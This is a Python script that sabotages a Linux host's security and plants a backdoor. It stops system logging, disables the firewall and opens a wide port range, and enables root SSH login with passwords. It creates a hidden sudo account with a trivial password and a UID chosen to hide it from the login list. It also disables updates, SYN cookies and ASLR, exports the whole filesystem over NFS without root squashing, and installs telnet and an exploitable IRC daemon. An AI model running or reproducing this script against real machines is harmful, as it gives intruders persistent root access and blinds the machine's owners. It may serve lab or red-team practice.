
#!/usr/bin/python

import os #import os to use system commands

def disableUFW(): #Source: https://www.configserverfirewall.com/ufw-ubuntu-firewall/enable-disable-ufw-ubuntu-firewall/
	os.system('ufw disable') #command to disable the ufw firewall
	os.system('systemctl stop ufw')
	os.system('systemctl disable ufw')

def ports(): #Source: https://askubuntu.com/questions/7099/how-can-i-open-a-range-of-ports-in-ubuntu-using-gufw
	os.system('ufw allow 21:8100/tcp')

def SSH(): #Source: https://www.cyberciti.biz/faq/how-to-install-ssh-on-ubuntu-linux-using-apt-get/
	os.system('apt-get install openssh-server -q=2') #this installs the openssh-server quietly and defaults all answers to yes
	os.system('rm /etc/ssh/sshd_config') #removes that original config file to not clash with the modified one. It will throw up a text box if the file is not deleted before hand
	conf=open('/etc/ssh/sshd_config','w') #Opens the config file to be able to write new info to it
	conf.write("PermitRootLogin yes\nPasswordAuthentication yes\nChallengeResponseAuthentication no\nUsePAM yes\nX11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem	sftp	/usr/lib/openssh/sftp-server")
	conf.close()
	os.system('service ssh restart')
	os.system('service ssh start')

def userForSSH(): #Source: https://vitux.com/how-to-make-a-user-an-administrator-in-ubuntu/
	os.system('useradd system') #This will create a user called system with the password fill, this also skips the naming stuff
	os.system('echo "system:password" | chpasswd') #This changes the users password
	os.system('usermod -aG sudo system') #This adds the user to the sudo group which gives them admin
	os.system('usermod -u 800 system') #Any user with a uid/gid of under 1000 will not show up in the user login list

def systemLogs(): #Source: https://stackoverflow.com/questions/17358499/linux-how-to-disable-all-log
	os.system('systemctl stop rsyslog.service') #This stops and disables the syslog log so no future executions/changes will be logged.
	os.system('systemctl disable rsyslog.service')

def disableUpdates(): #Source: https://www.garron.me/en/linux/turn-off-stop-ubuntu-automatic-update.html
	w=open('/etc/apt/apt.conf.d/10periodic','w') #Opens the 10periodic file to write
	w.write('APT::Periodic::Update-Package-Lists "0";\nAPT::Periodic::Download-Upgradeable-Packages "0";\nAPT::Periodic::AutocleanInterval "0";')
	w.close()

def disableSYNcookies(): #Source: https://www.cyberciti.biz/faq/enable-tcp-syn-cookie-protection/
	a=open('/etc/sysctl.conf','a') #opens file to append
	a.write('net.ipv4.tcp_syncookies=0') #Sets syn cookies to 0 which disables it for good
	a.close()
	os.system('sysctl -p') #reloads the change
	w=open('/etc/sysctl.d/10-network-security.conf','w') #opens file to write
	w.write('net.ipv4.conf.default.rp_filter=1\nnet.ipv4.conf.all.rp_filter=1\nnet.ipv4.tcp_syncookies=0') #Sets syn cookies to 0 which disables it for good
	w.close()
	os.system('sysctl -p') #reloads the change

def exportRoot(): #Source: https://www.dummies.com/computers/operating-systems/linux/how-to-share-files-with-nfs-on-linux-systems/
	os.system('apt-get install nfs-kernel-server -q=2')
	a=open('/etc/exports','a') #opens file to append
	a.write('/ *(rw,insecure,sync,no_all_squash,no_root_squash,no_subtree_check)') #This exports the entire FS from root and allows anyone from anysubnet to mount it
	a.close() # The above line also allows the remote root user to act as the root user on this share, giving them access to all files on the system without restrictions.
	os.system('exportfs -a')

def telnet():
	os.system('apt-get install telnetd -q=2')

def irc():
	os.system('apt-get install ircd-irc2 -q=2')
	os.system('systemctl restart ircd-irc2.service')

def aslr(): #Source: https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization
	w=open('/proc/sys/kernel/randomize_va_space','w') #Opens aslr config file to write
	w.write('0') #This will give the file a value of 0 which means no randomization everything is static. This will make a buffer overflow attack way easier for an attacker
	w.close()
	os.system('touch /etc/sysctl.d/01-disable-aslr.conf')
	w=open('/etc/sysctl.d/01-disable-aslr.conf','w')
	w.write('kernel.randomize_va_space = 0')
	w.close()
	
	

systemLogs() #This shuts down all system logs
ports() #This opens most valuable ports
disableUFW() #This calls the function to disable the ufw firewall
SSH() #This calls to install ssh-server and configure it for people to be able to SSH into the machine with root access
userForSSH() #I added this incase the root password was ever changed on the system, the attack would still be able to access the computers command line through SSH with this account.
disableUpdates() #This disables auto updates, this ensures that the systeem will not update automatically and revert all the changes you made to the system
disableSYNcookies() #This disables SYN cookies which helps mitigate a SYN-flood attack.
exportRoot() #This exports the entire FS of the system from root dir.
telnet() #This installs telnet for remote login
irc() #This installs irc so you can exploit it later with a postgresql exploit on irc to gain root cli access
aslr() #This disables aslr which is a security protection against buffer overflows



